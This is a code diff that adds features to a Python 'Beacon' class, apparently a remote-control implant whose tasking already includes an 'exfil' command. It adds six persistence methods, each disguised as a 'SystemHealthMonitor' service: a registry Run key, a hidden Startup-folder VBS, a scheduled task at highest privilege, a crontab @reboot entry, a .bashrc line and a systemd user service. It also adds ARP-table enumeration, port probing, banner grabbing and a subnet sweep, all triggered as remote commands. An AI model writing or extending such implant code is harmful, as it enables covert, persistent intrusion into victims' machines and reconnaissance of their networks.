@@ -12,9 +12,12 @@ import logging
 import os
 import platform
 import random
+import re
 import shutil
+import socket
 import stat
 import subprocess
+import sys
 import threading
 import time
 from pathlib import Path
@@ -220,7 +223,28 @@ class Beacon:
             "user": os.getenv("USER", os.getenv("USERNAME", "unknown")),
             "uptime": self._get_uptime(),
             "interval": self.interval,
+            "local_ips": self._get_local_ips(),
         }
+
+    @staticmethod
+    def _get_local_ips() -> list:
+        ips = []
+        try:
+            for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
+                addr = info[4][0]
+                if addr not in ips and addr != "127.0.0.1":
+                    ips.append(addr)
+        except Exception:
+            pass
+        if not ips:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.connect(("8.8.8.8", 80))
+                ips.append(s.getsockname()[0])
+                s.close()
+            except Exception:
+                pass
+        return ips
 
     @staticmethod
     def _get_uptime() -> int:
@@ -455,6 +479,483 @@ class Beacon:
         except Exception as e:
             return f"[error: {e}]"
 
+    # ── Persistence ──
+
+    def _get_beacon_path(self) -> str:
+        return os.path.abspath(sys.argv[0])
+
+    def _exec_persist(self, method: str) -> str:
+        method = (method or "auto").strip().lower()
+        beacon_path = self._get_beacon_path()
+        python_path = sys.executable
+        cmd_line = f"{python_path} {beacon_path}"
+
+        if method == "auto":
+            method = "registry" if platform.system() == "Windows" else "crontab"
+
+        try:
+            if method == "registry":
+                if platform.system() != "Windows":
+                    return "[error] Registry persistence only available on Windows"
+                import winreg
+                key = winreg.OpenKey(
+                    winreg.HKEY_CURRENT_USER,
+                    r"Software\Microsoft\Windows\CurrentVersion\Run",
+                    0, winreg.KEY_SET_VALUE,
+                )
+                winreg.SetValueEx(key, "SystemHealthMonitor", 0, winreg.REG_SZ, cmd_line)
+                winreg.CloseKey(key)
+                return f"Persistence installed: HKCU\\...\\Run\\SystemHealthMonitor\n{cmd_line}"
+
+            elif method == "startup":
+                if platform.system() != "Windows":
+                    return "[error] Startup folder persistence only available on Windows"
+                startup = Path(os.environ.get("APPDATA", "")) / \
+                    r"Microsoft\Windows\Start Menu\Programs\Startup"
+                lnk_vbs = startup / "SystemHealth.vbs"
+                lnk_vbs.write_text(
+                    f'CreateObject("WScript.Shell").Run "{cmd_line}", 0, False\n'
+                )
+                return f"Persistence installed: {lnk_vbs}"
+
+            elif method == "schtask":
+                if platform.system() != "Windows":
+                    return "[error] Scheduled task persistence only available on Windows"
+                result = subprocess.run(
+                    ["schtasks", "/create", "/tn", "SystemHealthMonitor",
+                     "/tr", cmd_line, "/sc", "onlogon", "/rl", "highest", "/f"],
+                    capture_output=True, text=True, timeout=15,
+                )
+                if result.returncode == 0:
+                    return f"Persistence installed: schtask SystemHealthMonitor\n{result.stdout.strip()}"
+                return f"[error] {result.stderr.strip()}"
+
+            elif method == "crontab":
+                if platform.system() == "Windows":
+                    return "[error] Crontab not available on Windows"
+                existing = subprocess.run(
+                    ["crontab", "-l"], capture_output=True, text=True, timeout=10,
+                )
+                lines = existing.stdout if existing.returncode == 0 else ""
+                marker = "# raccoon-persist"
+                if marker in lines:
+                    return "Persistence already installed (crontab)"
+                entry = f"@reboot {cmd_line} {marker}\n"
+                new_cron = lines.rstrip("\n") + "\n" + entry
+                proc = subprocess.run(
+                    ["crontab", "-"], input=new_cron, capture_output=True, text=True, timeout=10,
+                )
+                if proc.returncode == 0:
+                    return f"Persistence installed: crontab @reboot\n{cmd_line}"
+                return f"[error] {proc.stderr.strip()}"
+
+            elif method == "bashrc":
+                if platform.system() == "Windows":
+                    return "[error] bashrc not available on Windows"
+                rc = Path.home() / ".bashrc"
+                marker = "# raccoon-persist"
+                content = rc.read_text() if rc.exists() else ""
+                if marker in content:
+                    return "Persistence already installed (.bashrc)"
+                line = f"\n(nohup {cmd_line} &>/dev/null &) {marker}\n"
+                rc.write_text(content + line)
+                return f"Persistence installed: ~/.bashrc"
+
+            elif method == "systemd":
+                if platform.system() == "Windows":
+                    return "[error] systemd not available on Windows"
+                svc_dir = Path.home() / ".config" / "systemd" / "user"
+                svc_dir.mkdir(parents=True, exist_ok=True)
+                svc = svc_dir / "system-health.service"
+                svc.write_text(
+                    f"[Unit]\nDescription=System Health Monitor\n\n"
+                    f"[Service]\nExecStart={cmd_line}\nRestart=always\n"
+                    f"RestartSec=30\n\n[Install]\nWantedBy=default.target\n"
+                )
+                subprocess.run(
+                    ["systemctl", "--user", "enable", "--now", "system-health"],
+                    capture_output=True, text=True, timeout=15,
+                )
+                return f"Persistence installed: systemd user service\n{svc}"
+
+            else:
+                return f"[error] Unknown method: {method}\nAvailable: auto, registry, startup, schtask, crontab, bashrc, systemd"
+
+        except Exception as e:
+            return f"[error] {e}"
+
+    def _exec_unpersist(self, method: str) -> str:
+        method = (method or "auto").strip().lower()
+        if method == "auto":
+            method = "registry" if platform.system() == "Windows" else "crontab"
+
+        try:
+            if method == "registry":
+                import winreg
+                key = winreg.OpenKey(
+                    winreg.HKEY_CURRENT_USER,
+                    r"Software\Microsoft\Windows\CurrentVersion\Run",
+                    0, winreg.KEY_SET_VALUE,
+                )
+                try:
+                    winreg.DeleteValue(key, "SystemHealthMonitor")
+                except FileNotFoundError:
+                    return "No registry persistence found"
+                finally:
+                    winreg.CloseKey(key)
+                return "Registry persistence removed"
+
+            elif method == "startup":
+                lnk = Path(os.environ.get("APPDATA", "")) / \
+                    r"Microsoft\Windows\Start Menu\Programs\Startup\SystemHealth.vbs"
+                if lnk.exists():
+                    lnk.unlink()
+                    return f"Startup persistence removed: {lnk}"
+                return "No startup persistence found"
+
+            elif method == "schtask":
+                result = subprocess.run(
+                    ["schtasks", "/delete", "/tn", "SystemHealthMonitor", "/f"],
+                    capture_output=True, text=True, timeout=15,
+                )
+                return result.stdout.strip() or result.stderr.strip() or "Scheduled task removed"
+
+            elif method == "crontab":
+                existing = subprocess.run(
+                    ["crontab", "-l"], capture_output=True, text=True, timeout=10,
+                )
+                if existing.returncode != 0:
+                    return "No crontab found"
+                marker = "# raccoon-persist"
+                lines = [l for l in existing.stdout.splitlines() if marker not in l]
+                subprocess.run(
+                    ["crontab", "-"], input="\n".join(lines) + "\n",
+                    capture_output=True, text=True, timeout=10,
+                )
+                return "Crontab persistence removed"
+
+            elif method == "bashrc":
+                rc = Path.home() / ".bashrc"
+                if not rc.exists():
+                    return "No .bashrc found"
+                marker = "# raccoon-persist"
+                lines = [l for l in rc.read_text().splitlines() if marker not in l]
+                rc.write_text("\n".join(lines) + "\n")
+                return ".bashrc persistence removed"
+
+            elif method == "systemd":
+                subprocess.run(
+                    ["systemctl", "--user", "disable", "--now", "system-health"],
+                    capture_output=True, text=True, timeout=15,
+                )
+                svc = Path.home() / ".config" / "systemd" / "user" / "system-health.service"
+                if svc.exists():
+                    svc.unlink()
+                return "Systemd persistence removed"
+
+            else:
+                return f"[error] Unknown method: {method}"
+
+        except Exception as e:
+            return f"[error] {e}"
+
+    # ── ARP table ──
+
+    _MAC_PREFIXES = {
+        "00:50:56": "VMware", "00:0c:29": "VMware", "00:05:69": "VMware",
+        "00:1c:14": "VMware", "00:15:5d": "Hyper-V", "08:00:27": "VirtualBox",
+        "0a:00:27": "VirtualBox", "52:54:00": "QEMU/KVM",
+        "b8:27:eb": "Raspberry Pi", "dc:a6:32": "Raspberry Pi",
+        "e4:5f:01": "Raspberry Pi", "d8:3a:dd": "Raspberry Pi",
+        "ac:de:48": "Apple", "00:1b:63": "Apple", "3c:22:fb": "Apple",
+        "f8:ff:c2": "Apple",
+        "00:1a:a0": "Dell", "f8:db:88": "Dell", "00:14:22": "Dell",
+        "00:1e:c9": "Dell",
+        "00:25:b5": "HP", "3c:d9:2b": "HP", "d4:c9:ef": "HP",
+        "70:10:6f": "HP",
+        "00:1c:c0": "Intel", "a4:bf:01": "Intel", "00:1b:21": "Intel",
+        "f8:63:3f": "Intel",
+        "00:04:4b": "Nvidia", "48:b0:2d": "Nvidia",
+        "b4:2e:99": "Cisco", "00:1b:0d": "Cisco", "00:1e:14": "Cisco",
+        "00:26:0b": "Cisco", "00:50:0f": "Cisco",
+        "00:09:0f": "Fortinet", "00:60:b0": "Hewlett Packard",
+        "f0:9f:c2": "Ubiquiti", "24:a4:3c": "Ubiquiti",
+        "44:d9:e7": "Ubiquiti", "fc:ec:da": "Ubiquiti",
+        "00:1a:2b": "Juniper", "00:05:85": "Juniper",
+        "00:23:9c": "Juniper",
+        "00:0d:b9": "PC Engines", "00:08:e3": "Huawei",
+        "00:e0:fc": "Huawei", "48:46:fb": "Huawei",
+        "08:00:20": "Sun/Oracle", "00:03:ba": "Sun/Oracle",
+        "00:1d:09": "TP-Link", "50:c7:bf": "TP-Link",
+        "ec:08:6b": "TP-Link",
+        "a8:5e:45": "ASUS", "00:1a:92": "ASUS",
+        "00:1f:1f": "ASUS",
+        "bc:5f:f4": "ASRock", "d0:50:99": "ASRock",
+        "00:0e:8f": "Netgear", "c0:ff:d4": "Netgear",
+        "30:46:9a": "Netgear",
+        "e0:91:f5": "Synology", "00:11:32": "Synology",
+        "c4:3d:c7": "Netgear", "20:cf:30": "QNAP",
+        "00:08:9b": "QNAP",
+        "b0:be:76": "TP-Link", "14:cc:20": "TP-Link",
+        "00:24:d4": "Freebox", "68:a3:78": "Freebox",
+        "02:42": "Docker",
+    }
+
+    @classmethod
+    def _mac_vendor(cls, mac: str) -> str:
+        m = mac.lower().replace("-", ":")
+        for prefix_len in (8, 5):
+            prefix = m[:prefix_len]
+            if prefix in cls._MAC_PREFIXES:
+                return cls._MAC_PREFIXES[prefix]
+        return ""
+
+    @staticmethod
+    def _guess_os(ports: list, vendor: str) -> str:
+        ps = set(ports)
+        if 3389 in ps or 135 in ps or 139 in ps:
+            return "Windows"
+        if 548 in ps or 5353 in ps:
+            return "macOS" if "Apple" in vendor else "Apple/macOS"
+        if 22 in ps and 111 in ps:
+            return "Linux/Unix"
+        if 22 in ps:
+            return "Linux"
+        if 80 in ps or 443 in ps:
+            if vendor:
+                if "Cisco" in vendor or "Juniper" in vendor or "Fortinet" in vendor:
+                    return "Network Device"
+                if "Ubiquiti" in vendor:
+                    return "Ubiquiti AP"
+                if "Synology" in vendor or "QNAP" in vendor:
+                    return "NAS"
+            return "Web Device"
+        if vendor and ("Raspberry" in vendor):
+            return "Linux (RPi)"
+        return ""
+
+    @staticmethod
+    def _probe_ports(ip: str, ports: list, timeout: float = 0.8) -> list:
+        open_ports = []
+        for p in ports:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(timeout)
+                s.connect((ip, p))
+                open_ports.append(p)
+                s.close()
+            except Exception:
+                pass
+        return open_ports
+
+    @staticmethod
+    def _grab_banner(ip: str, port: int, timeout: float = 1.0) -> str:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(timeout)
+            s.connect((ip, port))
+            if port == 80:
+                s.sendall(b"HEAD / HTTP/1.0\r\nHost: " + ip.encode() + b"\r\n\r\n")
+            elif port == 443:
+                s.close()
+                return "HTTPS"
+            else:
+                pass
+            s.settimeout(1.5)
+            data = s.recv(256)
+            s.close()
+            line = data.decode("utf-8", errors="replace").split("\n")[0].strip()
+            return line[:120]
+        except Exception:
+            return ""
+
+    _PORT_NAMES = {
+        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
+        80: "HTTP", 110: "POP3", 111: "RPC", 135: "MSRPC", 139: "NetBIOS",
+        143: "IMAP", 161: "SNMP", 389: "LDAP", 443: "HTTPS", 445: "SMB",
+        548: "AFP", 631: "IPP", 993: "IMAPS", 995: "POP3S",
+        1433: "MSSQL", 1521: "Oracle", 3306: "MySQL", 3389: "RDP",
+        5353: "mDNS", 5432: "PostgreSQL", 5900: "VNC", 5985: "WinRM",
+        6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
+        8888: "HTTP-Alt", 9090: "HTTP-Alt", 9200: "Elasticsearch",
+        27017: "MongoDB",
+    }
+
+    def _exec_arptable(self) -> str:
+        entries = []
+        try:
+            if platform.system() == "Windows":
+                r = subprocess.run(
+                    ["arp", "-a"], capture_output=True, text=True, timeout=10,
+                )
+                for line in r.stdout.splitlines():
+                    parts = line.split()
+                    if len(parts) >= 3 and parts[0].count(".") == 3:
+                        ip = parts[0]
+                        mac = parts[1].replace("-", ":")
+                        typ = parts[2] if len(parts) > 2 else "?"
+                        if ip not in ("255.255.255.255",) and not ip.endswith(".255"):
+                            entries.append({"ip": ip, "mac": mac, "type": typ})
+            else:
+                r = subprocess.run(
+                    ["arp", "-a"], capture_output=True, text=True, timeout=10,
+                )
+                if r.returncode != 0:
+                    r = subprocess.run(
+                        ["ip", "neigh", "show"], capture_output=True, text=True, timeout=10,
+                    )
+                for line in r.stdout.splitlines():
+                    ip_m = re.search(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", line)
+                    mac_m = re.search(r"([\da-fA-F]{2}[:-]){5}[\da-fA-F]{2}", line)
+                    if ip_m:
+                        ip = ip_m.group(1)
+                        mac = mac_m.group(0) if mac_m else "?"
+                        if ip not in ("255.255.255.255",) and not ip.endswith(".255"):
+                            entries.append({"ip": ip, "mac": mac, "type": "?"})
+        except Exception as e:
+            return f"[error] {e}"
+
+        my_ips = set(self._get_local_ips())
+        common_ports = [21,22,23,25,53,80,110,135,139,143,443,445,
+                        548,631,3306,3389,5353,5432,5900,5985,8080,8443]
+        threads = []
+        lock = threading.Lock()
+
+        def enrich(ent):
+            ip = ent["ip"]
+            try:
+                h = socket.getfqdn(ip)
+                ent["hostname"] = "" if h == ip else h
+            except Exception:
+                ent["hostname"] = ""
+            ent["vendor"] = self._mac_vendor(ent["mac"])
+            ent["ports"] = self._probe_ports(ip, common_ports)
+            ent["os_guess"] = self._guess_os(ent["ports"], ent["vendor"])
+            ent["self"] = ip in my_ips
+            banners = {}
+            for p in ent["ports"][:3]:
+                b = self._grab_banner(ip, p)
+                if b:
+                    banners[p] = b
+            ent["banners"] = banners
+            port_info = []
+            for p in ent["ports"]:
+                name = self._PORT_NAMES.get(p, "")
+                banner = banners.get(p, "")
+                s = str(p)
+                if name:
+                    s += "/" + name
+                if banner:
+                    s += " (" + banner + ")"
+                port_info.append(s)
+            ent["port_info"] = port_info
+
+        for ent in entries:
+            t = threading.Thread(target=enrich, args=(ent,), daemon=True)
+            threads.append(t)
+            t.start()
+            if len(threads) >= 10:
+                for tt in threads:
+                    tt.join(timeout=5)
+                threads = []
+        for tt in threads:
+            tt.join(timeout=5)
+
+        result = json.dumps({"entries": entries, "count": len(entries)})
+        return result
+
+    # ── Network scan ──
+
+    def _exec_netscan(self, args: str) -> str:
+        timeout_s = 1
+        parts = args.strip().split() if args else []
+        subnet = parts[0] if parts else ""
+
+        if not subnet:
+            for ip in self._get_local_ips():
+                octets = ip.rsplit(".", 1)
+                if len(octets) == 2:
+                    subnet = octets[0] + ".0/24"
+                    break
+
+        if not subnet:
+            return "[error] No subnet specified and no local IP found"
+
+        base = subnet.split("/")[0].rsplit(".", 1)[0]
+        results = []
+        results.append(f"Scanning {base}.0/24 ...")
+
+        def _ping_host(ip):
+            try:
+                if platform.system() == "Windows":
+                    r = subprocess.run(
+                        ["ping", "-n", "1", "-w", str(timeout_s * 1000), ip],
+                        capture_output=True, text=True, timeout=timeout_s + 2,
+                    )
+                else:
+                    r = subprocess.run(
+                        ["ping", "-c", "1", "-W", str(timeout_s), ip],
+                        capture_output=True, text=True, timeout=timeout_s + 2,
+                    )
+                return r.returncode == 0
+            except Exception:
+                return False
+
+        def _tcp_probe(ip, port):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(timeout_s)
+                s.connect((ip, port))
+                s.close()
+                return True
+            except Exception:
+                return False
+
+        alive = []
+        threads = []
+        lock = threading.Lock()
+
+        def scan_host(ip):
+            if _ping_host(ip) or _tcp_probe(ip, 445) or _tcp_probe(ip, 22):
+                hostname = ""
+                try:
+                    hostname = socket.getfqdn(ip)
+                    if hostname == ip:
+                        hostname = ""
+                except Exception:
+                    pass
+                ports = []
+                for p in [22, 80, 135, 139, 443, 445, 3389, 8080, 8443]:
+                    if _tcp_probe(ip, p):
+                        ports.append(p)
+                with lock:
+                    alive.append({"ip": ip, "hostname": hostname, "ports": ports})
+
+        for i in range(1, 255):
+            ip = f"{base}.{i}"
+            t = threading.Thread(target=scan_host, args=(ip,), daemon=True)
+            threads.append(t)
+            t.start()
+            if len(threads) >= 20:
+                for t in threads:
+                    t.join(timeout=timeout_s + 3)
+                threads = []
+
+        for t in threads:
+            t.join(timeout=timeout_s + 3)
+
+        alive.sort(key=lambda h: tuple(int(o) for o in h["ip"].split(".")))
+        my_ips = set(self._get_local_ips())
+
+        for h in alive:
+            marker = " [SELF]" if h["ip"] in my_ips else ""
+            port_str = ",".join(str(p) for p in h["ports"]) if h["ports"] else "-"
+            host_str = f' ({h["hostname"]})' if h["hostname"] else ""
+            results.append(f'  {h["ip"]}{host_str}  ports:[{port_str}]{marker}')
+
+        results.append(f"\n{len(alive)} hosts alive")
+        return "\n".join(results)
+
     # ── Task dispatcher ──
 
     def _process_tasking(self, tasking: dict):
@@ -545,6 +1046,18 @@ class Beacon:
             elif cmd == "exfil":
                 output = "Exfil scan triggered"
                 logger.info("Exfil tasking received")
+
+            elif cmd == "netscan":
+                output = self._exec_netscan(args)
+
+            elif cmd == "arptable":
+                output = self._exec_arptable()
+
+            elif cmd == "persist":
+                output = self._exec_persist(args)
+
+            elif cmd == "unpersist":
+                output = self._exec_unpersist(args)
 
             else:
                 status = "error"
